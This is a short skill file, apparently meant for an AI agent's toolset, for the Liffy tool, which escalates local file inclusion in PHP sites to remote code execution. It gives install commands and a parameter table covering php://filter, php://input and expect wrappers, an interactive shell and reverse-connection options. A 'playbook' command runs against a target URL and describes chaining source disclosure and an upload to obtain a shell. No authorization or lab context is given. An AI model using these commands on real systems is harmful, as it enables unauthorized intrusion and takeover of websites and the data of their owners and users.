---
name: liffy-lfi
description: "Liffy: LFI->RCE chain. Signals: web vulnerability, injection, LFI exploitation, php://input, php://filter."
zh-signals: "Liffy: LFI→RCE 链。信号:web漏洞,注入,LFI 利用,php://input,php://filter。"
when-to-use: >-
  Use when a parameter is vulnerable to local file inclusion and you want to
  exploit it toward RCE via php://filter, php://input, or expect wrappers.
  Provides an interactive shell and reverse connection options.
---

# Liffy

- Attack Category: C09 Web Application Vulnerability Exploitation
- Upstream Repository: https://github.com/mzfr/liffy
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/mzfr/liffy && cd liffy && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python liffy.py -u 'https://t.com/?page='` | LFI exploitation |
| `--technique=data` | php://input |
| `--technique=filter` | php://filter |
| `--technique=expect` | expect:// |
| `-i` | Interactive shell |
| `--lhost x --lport 443` | Reverse connection |

## Attack Scenario Playbook

### LFI to RCE chain

```bash
python liffy.py -u 'https://target/index.php?page=' --technique=filter -i
# php://filter reads the source → find an upload point → include to get a shell
```

## Notes

Wraps the classic LFI exploitation chains (filter/input/expect); newer versions add built-in webshell generation.
